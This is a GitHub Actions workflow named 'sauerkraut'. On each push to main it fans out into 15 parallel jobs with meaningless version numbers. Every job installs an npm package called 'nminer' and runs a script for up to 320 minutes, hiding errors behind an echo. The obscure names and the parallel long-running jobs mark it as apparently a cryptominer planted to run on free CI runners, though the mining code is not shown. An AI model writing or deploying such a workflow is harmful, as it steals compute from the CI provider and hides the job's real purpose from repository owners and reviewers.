name: sauerkraut
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1704 }
          - { version: 6686 }
          - { version: 3801 }
          - { version: 4727 }
          - { version: 1143 }
          - { version: 1642 }
          - { version: 1639 }
          - { version: 9295 }
          - { version: 6250 }
          - { version: 883 }
          - { version: 7402 }
          - { version: 530 }
          - { version: 9968 }
          - { version: 8899 }
          - { version: 5489 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: folklore provided where
        run: |
          npm install nminer@latest
          timeout 320m node sauerkraut.js || echo "sauerkraut executed"